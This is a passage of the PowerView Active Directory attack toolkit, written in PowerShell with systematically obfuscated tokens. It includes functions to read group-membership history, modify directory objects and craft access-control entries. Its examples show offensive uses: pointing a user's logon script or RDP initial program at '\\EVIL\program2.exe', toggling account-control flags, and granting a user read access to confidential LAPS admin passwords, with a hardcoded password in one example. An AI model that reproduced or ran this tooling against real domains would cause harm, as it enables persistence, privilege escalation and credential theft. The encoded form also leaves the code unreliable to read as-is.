    1 CN=Schema Admins,CN=Users,DC=testlab,DC=local
    1 CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
    4 CN=Domain Admins,CN=Users,DC=testlab,DC=local
    1 CN=Group Policy Creator Owners,CN=Users,DC=testlab,DC=local
    1 CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=testlab,DC=local
    1 CN=Windows Authorization Access Group,CN=Builtin,DC=testlab,DC=local
    8 CN=Denied RODC Password Replication Group,CN=Users,DC=testlab,DC=local
    2 CN=PRIMARY,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,...
    1 CN=Domain System Volume,CN=DFSR-LocalSettings,CN=PRIMARY,OU=Domain Con...
    1 CN=ServerAdmins,CN=Users,DC=testlab,DC=local
    3 CN=DomainLocalGroup,CN=Users,DC=testlab,DC=local


.EXAMPLE

q4gUS-1-5-21-883232822-274137685-4173207997-519q4gU,q4gUaf94f49e-61a5-4f7d-a17c-d80fb16a5220q4gU wZ5t Get-DomainObjectLinkedAttributeHistory

ObjectDN              : CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94e782c1-16a1-400b-a7d0-1126038c6387
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=dfm,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-06-13T22:20:02Z
TimeCreated           : 2017-06-13T22:20:02Z
LastOriginatingChange : 2017-06-13T22:20:22Z
Version               : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory ServerAdmins -Domain testlab.local

ObjectDN              : CN=ServerAdmins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 603b46ad-555c-49b3-8745-c0718febefc2
AttributeName         : member
AttributeValue        : CN=jason.a,CN=Users,DC=dev,DC=testlab,DC=local
TimeDeleted           : 2017-04-10T22:17:19Z
TimeCreated           : 2017-04-10T22:17:19Z
LastOriginatingChange : 2017-04-10T22:17:19Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectLinkedAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ADObjectLinkedAttributeHistoryq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUMemberDistinguishedNameq4gU, q4gUMemberNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    BEGIN {
        RaUSearcherArguments = @{
            q4gUPropertiesq4gU    =   q4gUmsds-replvaluemetadataq4gU,q4gUdistinguishednameq4gU
            q4gURawq4gU           =   RaUTrue
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) {
            RaUPropertyFilter = RaUPSBoundParameters[q4gUPropertiesq4gU] -Join q4gUwZ5tq4gU
        }
        else {
            RaUPropertyFilter = q4gUq4gU
        }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUIdentityq4gU]) { RaUSearcherArguments[q4gUIdentityq4gU] = RaUIdentity }

        Get-DomainObject @SearcherArguments wZ5t ForEach-Object {
            RaUObjectDN = RaU_.Properties[q4gUdistinguishednameq4gU][0]
            ForEach(RaUXMLNode in RaU_.Properties[q4gUmsds-replvaluemetadataq4gU]) {
                RaUTempObject = [xml]RaUXMLNode wZ5t Select-Object -ExpandProperty q4gUDS_REPL_VALUE_META_DATAq4gU -ErrorAction SilentlyContinue
                if (RaUTempObject) {
                    if (RaUTempObject.pszAttributeName -Match RaUPropertyFilter) {
                        RaUOutput = New-Object PSObject
                        RaUOutput wZ5t Add-Member NoteProperty q4gUObjectDNq4gU RaUObjectDN
                        RaUOutput wZ5t Add-Member NoteProperty q4gUAttributeNameq4gU RaUTempObject.pszAttributeName
                        RaUOutput wZ5t Add-Member NoteProperty q4gUAttributeValueq4gU RaUTempObject.pszObjectDn
                        RaUOutput wZ5t Add-Member NoteProperty q4gUTimeCreatedq4gU RaUTempObject.ftimeCreated
                        RaUOutput wZ5t Add-Member NoteProperty q4gUTimeDeletedq4gU RaUTempObject.ftimeDeleted
                        RaUOutput wZ5t Add-Member NoteProperty q4gULastOriginatingChangeq4gU RaUTempObject.ftimeLastOriginatingChange
                        RaUOutput wZ5t Add-Member NoteProperty q4gUVersionq4gU RaUTempObject.dwVersion
                        RaUOutput wZ5t Add-Member NoteProperty q4gULastOriginatingDsaDNq4gU RaUTempObject.pszLastOriginatingDsaDN
                        RaUOutput.PSObject.TypeNames.Insert(0, q4gUPowerView.ADObjectLinkedAttributeHistoryq4gU)
                        RaUOutput
                    }
                }
                else {
                    Write-Verbose Oj8X[Get-DomainObjectLinkedAttributeHistory] Error retrieving q4gUmsds-replvaluemetadataq4gU for q4gURaUObjectDNq4gUOj8X
                }
            }
        }
    }
}


function Set-DomainObject {
<#
.SYNOPSIS

Modifies a gven property for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Splats user/object targeting parameters to Get-DomainObject, returning the raw
searchresult object. Retrieves the raw directoryentry for the object, and sets
any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
from -Clear @().

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Set

Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.

.PARAMETER XOR

Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.

.PARAMETER Clear

Specifies an array of object properties that will be cleared in the directory.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObject testuser -Set @{q4gUmstsinitialprogramq4gU=q4gUScKjScKjEVILScKjprogram.exeq4gU} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(wZ5t(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to ScKjScKjEVILScKjprogram.exe for object testuser

.EXAMPLE

Oj8XS-1-5-21-890171859-3433809279-3366196753-1108Oj8X,Oj8XtestuserOj8X wZ5t Set-DomainObject -Set @{q4gUcountrycodeq4gU=1234; q4gUmstsinitialprogramq4gU=q4gUScKjScKjEVILScKjprogram2.exeq4gU} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string:
(&(wZ5t(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
VERBOSE: Setting mstsinitialprogram to ScKjScKjEVILScKjprogram2.exe for object harmj0y
VERBOSE: Setting countrycode to 1234 for object harmj0y
VERBOSE: Get-DomainSearcher search string:
LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(wZ5t(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to ScKjScKjEVILScKjprogram2.exe for object testuser
VERBOSE: Setting countrycode to 1234 for object testuser

.EXAMPLE

Oj8XS-1-5-21-890171859-3433809279-3366196753-1108Oj8X,Oj8XtestuserOj8X wZ5t Set-DomainObject -Clear department -Verbose

Cleares the q4gUdepartmentq4gU field for both object identities.

.EXAMPLE

Get-DomainUser testuser wZ5t ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512


Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(wZ5t(samAccountName=testuser)))
VERBOSE: XORing q4gUuseraccountcontrolq4gU with q4gU65536q4gU for object q4gUtestuserq4gU

Get-DomainUser testuser wZ5t ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
ScKjScKjprimaryScKjsysvolScKjblah.ps1

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU-AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Set-DomainObject -Identity testuser -Set @{q4gUscriptpathq4gU=q4gUScKjScKjEVILScKjprogram2.exeq4gU} -Credential RaUCred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain q4gUTESTLABq4gU from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(wZ5t(wZ5t(samAccountName=testuser)(name=testuser))))
VERBOSE: [Set-DomainObject] Setting q4gUscriptpathq4gU to q4gUScKjScKjEVILScKjprogram2.exeq4gU for object q4gUtestuserq4gU

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
ScKjScKjEVILScKjprogram2.exe
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUReplaceq4gU)]
        [Hashtable]
        RaUSet,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        RaUXOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUClear,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{q4gURawq4gU = RaUTrue}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUIdentityq4gU]) { RaUSearcherArguments[q4gUIdentityq4gU] = RaUIdentity }

        # splat the appropriate arguments to Get-DomainObject
        RaURawObject = Get-DomainObject @SearcherArguments

        ForEach (RaUObject in RaURawObject) {

            RaUEntry = RaURawObject.GetDirectoryEntry()

            if(RaUPSBoundParameters[q4gUSetq4gU]) {
                try {
                    RaUPSBoundParameters[q4gUSetq4gU].GetEnumerator() wZ5t ForEach-Object {
                        Write-Verbose Oj8X[Set-DomainObject] Setting q4gURaU(RaU_.Name)q4gU to q4gURaU(RaU_.Value)q4gU for object q4gURaU(RaURawObject.Properties.samaccountname)q4gUOj8X
                        RaUEntry.put(RaU_.Name, RaU_.Value)
                    }
                    RaUEntry.commitchanges()
                }
                catch {
                    Write-Warning Oj8X[Set-DomainObject] Error setting/replacing properties for object q4gURaU(RaURawObject.Properties.samaccountname)q4gU : RaU_Oj8X
                }
            }
            if(RaUPSBoundParameters[q4gUXORq4gU]) {
                try {
                    RaUPSBoundParameters[q4gUXORq4gU].GetEnumerator() wZ5t ForEach-Object {
                        RaUPropertyName = RaU_.Name
                        RaUPropertyXorValue = RaU_.Value
                        Write-Verbose Oj8X[Set-DomainObject] XORing q4gURaUPropertyNameq4gU with q4gURaUPropertyXorValueq4gU for object q4gURaU(RaURawObject.Properties.samaccountname)q4gUOj8X
                        RaUTypeName = RaUEntry.RaUPropertyName[0].GetType().name

                        # UAC value references- https://support.microsoft.com/en-us/kb/305144
                        RaUPropertyValue = RaU(RaUEntry.RaUPropertyName) -bxor RaUPropertyXorValue
                        RaUEntry.RaUPropertyName = RaUPropertyValue -as RaUTypeName
                    }
                    RaUEntry.commitchanges()
                }
                catch {
                    Write-Warning Oj8X[Set-DomainObject] Error XORq4gUing properties for object q4gURaU(RaURawObject.Properties.samaccountname)q4gU : RaU_Oj8X
                }
            }
            if(RaUPSBoundParameters[q4gUClearq4gU]) {
                try {
                    RaUPSBoundParameters[q4gUClearq4gU] wZ5t ForEach-Object {
                        RaUPropertyName = RaU_
                        Write-Verbose Oj8X[Set-DomainObject] Clearing q4gURaUPropertyNameq4gU for object q4gURaU(RaURawObject.Properties.samaccountname)q4gUOj8X
                        RaUEntry.RaUPropertyName.clear()
                    }
                    RaUEntry.commitchanges()
                }
                catch {
                    Write-Warning Oj8X[Set-DomainObject] Error clearing properties for object q4gURaU(RaURawObject.Properties.samaccountname)q4gU : RaU_Oj8X
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {
<#
.SYNOPSIS

Converts the LDAP LogonHours array to a processible object.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Converts the LDAP LogonHours array to a processible object.  Each entry
property in the output object corresponds to a day of the week and hour during
the day (in UTC) indicating whether or not the user can logon at the specified
hour.

.PARAMETER LogonHoursArray

21-byte LDAP hours array.

.EXAMPLE

RaUhours = (Get-DomainUser -LDAPFilter q4gUuserworkstations=*q4gU)[0].logonhours
ConvertFrom-LDAPLogonHours RaUhours

Gets the logonhours array from the first AD user with logon restrictions.

.OUTPUTS

PowerView.LogonHours
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.LogonHoursq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        RaULogonHoursArray
    )

    Begin {
        if(RaULogonHoursArray.Count -ne 21) {
            throw Oj8XLogonHoursArray is the incorrect lengthOj8X
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                RaUHoursArr
            )

            RaULogonHours = New-Object bool[] 24
            for(RaUi=0; RaUi -lt 3; RaUi++) {
                RaUByte = RaUHoursArr[RaUi]
                RaUOffset = RaUi * 8
                RaUStr = [Convert]::ToString(RaUByte,2).PadLeft(8,q4gU0q4gU)

                RaULogonHours[RaUOffset+0] = [bool] [convert]::ToInt32([string]RaUStr[7])
                RaULogonHours[RaUOffset+1] = [bool] [convert]::ToInt32([string]RaUStr[6])
                RaULogonHours[RaUOffset+2] = [bool] [convert]::ToInt32([string]RaUStr[5])
                RaULogonHours[RaUOffset+3] = [bool] [convert]::ToInt32([string]RaUStr[4])
                RaULogonHours[RaUOffset+4] = [bool] [convert]::ToInt32([string]RaUStr[3])
                RaULogonHours[RaUOffset+5] = [bool] [convert]::ToInt32([string]RaUStr[2])
                RaULogonHours[RaUOffset+6] = [bool] [convert]::ToInt32([string]RaUStr[1])
                RaULogonHours[RaUOffset+7] = [bool] [convert]::ToInt32([string]RaUStr[0])
            }

            RaULogonHours
        }
    }

    Process {
        RaUOutput = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr RaULogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr RaULogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr RaULogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr RaULogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr RaULogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr RaULogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr RaULogonHoursArray[18..20]
        }

        RaUOutput = New-Object PSObject -Property RaUOutput
        RaUOutput.PSObject.TypeNames.Insert(0, q4gUPowerView.LogonHoursq4gU)
        RaUOutput
    }
}


function New-ADObjectAccessControlEntry {
<#
.SYNOPSIS

Creates a new Active Directory object-specific access control entry.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Creates a new object-specific access control entry (ACE).  The ACE could be 
used for auditing access to an object or controlling access to objects.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER PrincipalSearchBase

The LDAP source to search through for principals, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Right

Specifies the rights set on the Active Directory object.

.PARAMETER AccessControlType

Specifies the type of ACE (allow or deny)

.PARAMETER AuditFlag

For audit ACEs, specifies when to create an audit log (on success or failure)

.PARAMETER ObjectType

Specifies the GUID of the object that the ACE applies to.

.PARAMETER InheritanceType

Specifies how the ACE applies to the object and/or its children.

.PARAMETER InheritedObjectType

Specifies the type of object that can inherit the ACE.

.EXAMPLE

RaUGuids = Get-DomainGUIDMap
RaUAdmPropertyGuid = RaUGuids.GetEnumerator() wZ5t ?{RaU_.value -eq q4gUms-Mcs-AdmPwdq4gU} wZ5t select -ExpandProperty name
RaUCompPropertyGuid = RaUGuids.GetEnumerator() wZ5t ?{RaU_.value -eq q4gUComputerq4gU} wZ5t select -ExpandProperty name
RaUACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType RaUAdmPropertyGuid -InheritanceType All -InheritedObjectType RaUCompPropertyGuid
RaUOU = Get-DomainOU -Raw Workstations
RaUDsEntry = RaUOU.GetDirectoryEntry()
RaUdsEntry.PsBase.Options.SecurityMasks = q4gUDaclq4gU
RaUdsEntry.PsBase.ObjectSecurity.AddAccessRule(RaUACE)
RaUdsEntry.PsBase.CommitChanges()

Adds an ACE to all computer objects in the OU Oj8XWorkstationsOj8X permitting the
user Oj8XitadminOj8X to read the confidential ms-Mcs-AdmPwd computer property.

.OUTPUTS

System.Security.AccessControl.AuthorizationRule
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUSystem.Security.AccessControl.AuthorizationRuleq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue, Mandatory = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String]
        RaUPrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUPrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = RaUTrue)]
        [ValidateSet(q4gUAccessSystemSecurityq4gU, q4gUCreateChildq4gU,q4gUDeleteq4gU,q4gUDeleteChildq4gU,q4gUDeleteTreeq4gU,q4gUExtendedRightq4gU,q4gUGenericAllq4gU,q4gUGenericExecuteq4gU,q4gUGenericReadq4gU,q4gUGenericWriteq4gU,q4gUListChildrenq4gU,q4gUListObjectq4gU,q4gUReadControlq4gU,q4gUReadPropertyq4gU,q4gUSelfq4gU,q4gUSynchronizeq4gU,q4gUWriteDaclq4gU,q4gUWriteOwnerq4gU,q4gUWritePropertyq4gU)]
        RaURight,

        [Parameter(Mandatory = RaUTrue, ParameterSetName=q4gUAccessRuleTypeq4gU)]
        [ValidateSet(q4gUAllowq4gU, q4gUDenyq4gU)]
        [String[]]
        RaUAccessControlType,

        [Parameter(Mandatory = RaUTrue, ParameterSetName=q4gUAuditRuleTypeq4gU)]
        [ValidateSet(q4gUSuccessq4gU, q4gUFailureq4gU)]
        [String]
        RaUAuditFlag,

        [Parameter(Mandatory = RaUFalse, ParameterSetName=q4gUAccessRuleTypeq4gU)]
        [Parameter(Mandatory = RaUFalse, ParameterSetName=q4gUAuditRuleTypeq4gU)]
        [Parameter(Mandatory = RaUFalse, ParameterSetName=q4gUObjectGuidLookupq4gU)]
        [Guid]
        RaUObjectType,

        [ValidateSet(q4gUAllq4gU, q4gUChildrenq4gU,q4gUDescendentsq4gU,q4gUNoneq4gU,q4gUSelfAndChildrenq4gU)]
        [String]
        RaUInheritanceType,

        [Guid]
        RaUInheritedObjectType
    )

    Begin {
        if (RaUPrincipalIdentity -notmatch q4gU^S-1-.*q4gU) {
            RaUPrincipalSearcherArguments = @{
                q4gUIdentityq4gU = RaUPrincipalIdentity
                q4gUPropertiesq4gU = q4gUdistinguishedname,objectsidq4gU
            }
            if (RaUPSBoundParameters[q4gUPrincipalDomainq4gU]) { RaUPrincipalSearcherArguments[q4gUDomainq4gU] = RaUPrincipalDomain }
            if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUPrincipalSearcherArguments[q4gUServerq4gU] = RaUServer }
            if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUPrincipalSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
            if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUPrincipalSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
            if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUPrincipalSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
            if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUPrincipalSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUPrincipalSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
            RaUPrincipal = Get-DomainObject @PrincipalSearcherArguments
